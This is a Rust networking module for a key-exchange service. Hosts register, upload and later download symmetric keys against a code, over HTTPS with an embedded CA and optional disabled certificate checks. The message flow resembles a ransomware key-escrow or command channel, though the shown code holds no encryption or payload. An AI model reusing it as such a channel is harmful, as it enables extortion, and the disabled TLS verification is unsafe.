pub mod structs {
    use serde::{Deserialize, Serialize};

    #[derive(Serialize, Deserialize, Debug)]
    pub struct Registration {
        pub id: String,
        pub hostname: String,
        pub proof: String,
    }

    #[derive(Serialize, Deserialize, Debug)]
    pub struct UploadSymKey {
        pub id: String,
        pub key: String,
        pub proof: String,
    }

    #[derive(Serialize, Deserialize, Debug)]
    pub struct AnnounceCompletion {
        pub id: String,
        pub proof: String,
    }

    #[derive(Serialize, Deserialize, Debug)]
    pub struct DownloadSymKey {
        pub id: String,
        pub code: String,
        pub proof: String,
    }
}

pub mod client {
    use crate::web::ureq_client::{web_get_recv_bytes_ureq, web_post_send_json_recv_text_ureq};

    const RETRIES: u8 = 5;
    const INITIAL_RETRY_WAIT: u64 = 10;

    pub fn web_get_recv_bytes(url: &str, verify_server: &bool) -> Option<Vec<u8>> {
        web_get_recv_bytes_ureq(url, verify_server, &INITIAL_RETRY_WAIT, &RETRIES)
    }

    pub fn web_post_send_json_recv_text<T: serde::Serialize>(
        url: &str,
        json: &T,
        verify_server: &bool,
    ) -> Option<String> {
        web_post_send_json_recv_text_ureq(url, json, verify_server, &INITIAL_RETRY_WAIT, &RETRIES)
    }
}

pub mod server_tls {
    use rust_embed::RustEmbed;
    #[derive(RustEmbed)]
    #[folder = "assets/cert"]
    #[exclude = "ca-cert.pem"]
    #[exclude = "ca-key.pem"]
    #[include = "cert.pem"]
    #[include = "key.pem"]
    #[exclude = "server.pem"]
    struct AssetCertPriv;

    pub fn get_tls_public_key() -> Vec<u8> {
        AssetCertPriv::get("cert.pem")
            .expect("Failed to get public key file")
            .data
            .to_vec()
    }
    pub fn get_tls_private_key() -> Vec<u8> {
        AssetCertPriv::get("key.pem")
            .expect("Failed to get private key file")
            .data
            .to_vec()
    }
}

pub mod client_tls {
    use rust_embed::RustEmbed;
    use std::borrow::Cow;
    #[derive(RustEmbed)]
    #[folder = "assets/cert"]
    #[include = "ca-cert.pem"]
    #[exclude = "ca-key.pem"]
    #[exclude = "cert.pem"]
    #[exclude = "key.pem"]
    #[exclude = "server.pem"]
    struct AssetCertPub;

    pub fn get_ca_public_key() -> Cow<'static, [u8]> {
        AssetCertPub::get("ca-cert.pem")
            .expect("Failed to get public key file")
            .data
    }
}

pub mod validate {
    use hex::encode;
    use lazy_static::lazy_static;
    use log::debug;
    use regex::Regex;
    use sha2::{Digest, Sha256};

    lazy_static! {
        static ref ID_REGEX: Regex = Regex::new(r"^[[:alnum:]]{16}$").expect("Invalid Regex");
        static ref HOSTNAME_REGEX: Regex =
            Regex::new(r"^[0-9A-Za-z.\-]{0,32}$").expect("Invalid Regex");
        static ref SHA265_REGEX: Regex = Regex::new(r"^[a-fA-F0-9]{64}$").expect("Invalid Regex");
        static ref KEY_REGEX: Regex = Regex::new(r"^[a-fA-F0-9]{32,8192}$").expect("Invalid Regex");
        static ref CODE_REGEX: Regex =
            Regex::new(r"^[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}-[[:alnum:]]{4}$")
                .expect("Invalid Regex");
        static ref CODE_SEGMENT_REGEX: Regex =
            Regex::new(r"^[[:alnum:]]{4}$").expect("Invalid Regex");
    }

    pub fn validate_id(id: &str) -> bool {
        ID_REGEX.is_match(id)
    }

    pub fn validate_hostname(hostname: &str) -> bool {
        HOSTNAME_REGEX.is_match(hostname)
    }

    pub fn validate_proof(proof: &str) -> bool {
        SHA265_REGEX.is_match(proof)
    }

    pub fn validate_key(key: &str) -> bool {
        KEY_REGEX.is_match(key)
    }

    pub fn validate_code_segment(code_segment: &str) -> bool {
        CODE_SEGMENT_REGEX.is_match(code_segment)
    }

    pub fn validate_code(code: &str) -> bool {
        CODE_REGEX.is_match(code)
    }

    pub fn create_proof(proof_source: &mut Vec<u8>, secret: &str) -> String {
        proof_source.extend_from_slice(secret.as_bytes());
        let mut hasher = Sha256::new();
        hasher.update(proof_source);
        let hash = hasher.finalize();
        debug!("Created SHA256 proof bytes: {:?}", hash);
        debug!("SHA265 hex value: {}", encode(hash));
        encode(hash)
    }

    pub fn check_proof(proof_source: &mut Vec<u8>, secret: &str, proof: &str) -> bool {
        let true_proof = create_proof(proof_source, secret);
        true_proof == proof
    }
}

mod ureq_client {
    use log::{debug, error, warn};
    use std::{io::Read, thread::sleep, time::Duration};

    use ureq::{
        tls::{Certificate, RootCerts, TlsConfig},
        Agent,
    };

    use crate::web::client_tls::get_ca_public_key;

    fn create_client_ureq(verify_server: &bool) -> Agent {
        let tls_config = match *verify_server {
            true => {
                debug!("Creating web client with server certificate verification");
                let ca_cert = Certificate::from_pem(&get_ca_public_key()).unwrap();
                TlsConfig::builder()
                    .root_certs(RootCerts::new_with_certs(&[ca_cert]))
                    .build()
            }
            false => {
                debug!("Creating web client without server certificate verification");
                TlsConfig::builder().disable_verification(true).build()
            }
        };

        Agent::config_builder()
            .tls_config(tls_config)
            .build()
            .into()
    }

    pub fn web_get_recv_bytes_ureq(
        url: &str,
        verify_server: &bool,
        initial_retry_wait: &u64,
        retries: &u8,
    ) -> Option<Vec<u8>> {
        let mut retry_wait = *initial_retry_wait;
        let client = create_client_ureq(verify_server);
        for _ in 0..*retries {
            let response = match client.get(url).call() {
                Ok(response_result) => {
                    debug!("Received sever response to GET: {:?}", response_result);
                    response_result
                }
                Err(response_result) => {
                    error!(
                        "Failed to receive server response to GET: {:?}",
                        response_result
                    );
                    warn!("Sleeping for {} seconds before retrying", retry_wait);
                    sleep(Duration::from_secs(retry_wait));
                    retry_wait *= 2;
                    continue;
                }
            };

            let content_length;
            match response.headers().get("Content-Length") {
                Some(content_length_header_result) => match content_length_header_result.to_str() {
                    Ok(content_length_header_string_result) => {
                        debug!(
                            "Successfuly retrieved string of Content-Length header: {}",
                            content_length_header_string_result
                        );
                        match content_length_header_string_result.parse() {
                            Ok(content_length_result) => {
                                debug!(
                                    "Successfuly parsed Content-Length header: {}",
                                    content_length_result
                                );
                                content_length = content_length_result;
                            }
                            Err(content_length_result) => {
                                error!(
                                    "Failed to parse Content-Length header: {}",
                                    content_length_result
                                );
                                content_length = 1;
                            }
                        }
                    }
                    Err(content_length_header_string_result) => {
                        error!(
                            "Failed to retrieve string of Content-Length header: {}",
                            content_length_header_string_result
                        );
                        content_length = 1;
                    }
                },
                None => {
                    error!("Failed to get Content-Length header");
                    content_length = 1;
                }
            }

            let mut content = Vec::with_capacity(content_length);
            match response
                .into_body()
                .into_reader()
                .take(10_000_000)
                .read_to_end(&mut content)
            {
                Ok(content_read_result) => {
                    debug!(
                        "Successfully read {} content bytes from response",
                        content_read_result
                    );
                }
                Err(content_read_result) => {
                    debug!(
                        "Failed to read content bytes from response: {}",
                        content_read_result
                    );
                    warn!("Sleeping for {} seconds before retrying", retry_wait);
                    sleep(Duration::from_secs(retry_wait));
                    retry_wait *= 2;
                    continue;
                }
            }

            return Some(content);
        }
        None
    }

    pub fn web_post_send_json_recv_text_ureq<T: serde::Serialize>(
        url: &str,
        json: &T,
        verify_server: &bool,
        initial_retry_wait: &u64,
        retries: &u8,
    ) -> Option<String> {
        let mut retry_wait = *initial_retry_wait;
        let client = create_client_ureq(verify_server);
        for _ in 0..*retries {
            let mut response = match client.post(url).send_json(json) {
                Ok(response_result) => {
                    debug!("Received sever response to POST: {:?}", response_result);
                    response_result
                }
                Err(response_result) => {
                    error!(
                        "Failed to receive server response to POST: {:?}",
                        response_result
                    );
                    warn!("Sleeping for {} seconds before retrying", retry_wait);
                    sleep(Duration::from_secs(retry_wait));
                    retry_wait *= 2;
                    continue;
                }
            };

            let content = match response.body_mut().read_to_string() {
                Ok(content_read_result) => {
                    debug!(
                        "Successfully read content text from response: {}",
                        content_read_result
                    );
                    content_read_result
                }
                Err(content_read_result) => {
                    debug!(
                        "Failed to read content text from response: {}",
                        content_read_result
                    );
                    warn!("Sleeping for {} seconds before retrying", retry_wait);
                    sleep(Duration::from_secs(retry_wait));
                    retry_wait *= 2;
                    continue;
                }
            };

            return Some(content);
        }
        None
    }
}
